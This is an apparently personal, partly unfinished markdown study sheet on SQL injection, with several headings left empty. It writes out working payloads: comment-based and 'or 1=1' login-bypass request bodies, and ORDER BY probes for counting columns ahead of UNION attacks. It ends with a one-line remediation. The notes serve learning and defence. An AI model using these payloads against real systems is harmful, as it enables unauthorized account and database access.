# SQL injections notes

## Definition
Common web app vulnerability caused by unsanitized user input being inserted into queries and consequently passed to a database for execution. 


## Classic SQL injections

### Identifying a simple SQL injection
To be able to test a SQL injection we can use `'` that will be interpreted as a delimiter and will normally generate an error. We can add `--` to denote what follows as a comment in SQL: 
```
(POST request body)
username="admin'--"&password=passwd
```
The generated SQL will ressemble the following:
```sql
SELECT Id FROM users WHERE Username='admin'--' AND PASSWORD='passwd'
                                           #-> the rest of the query starting here is ignored.
```

### Simple authentication bypass
Same as before but by taking into account all comments possibilities and cases when the username does not exist : 
```
(POST request body)
username="admin' or 1=1;#--"&password=passwd
```
The generated SQL will ressemble the following:
```sql
SELECT Id FROM users WHERE Username='admin' or 1=1;#--' AND PASSWORD='passwd'
                                           #-> the rest of the query starting here is ignored.
```

### Enumerating the database


### UNION-based Payloads
2 conditions are needed : 
- the injected `UNION` query has to include the same number of columns as the original query.
- the data types needs to be compatible between each other. 

#### Knowing the number of columns available 
(Usually either the number of columns that shows on a normal query of the number  + 1 for the ID)
We can determine the exact number by injecting on at a time :
```
' ORDER BY 1 --// 
' ORDER BY 2 --//
..
' ORDER BY n --// -> number of columns equals n-1 if error at n
```

#### UNION payloads
null works for every type (and let's hopefully pray there aren't any weird types)


### tips and tricks
- We can add `LIMIT 1;` to limit the returned records to 1.
- `LIMIT 1` can also bypass condition where the is a check of the number of returned records.
- Blackbox testing always needs experimentation. 

## Blind SQL injections

### Boolean-based SQLi

### Time-based SQLi


## Injections in NoSQL

## SQLmap tips & tricks

## Remediation
Using ORMs or parameterized queries. 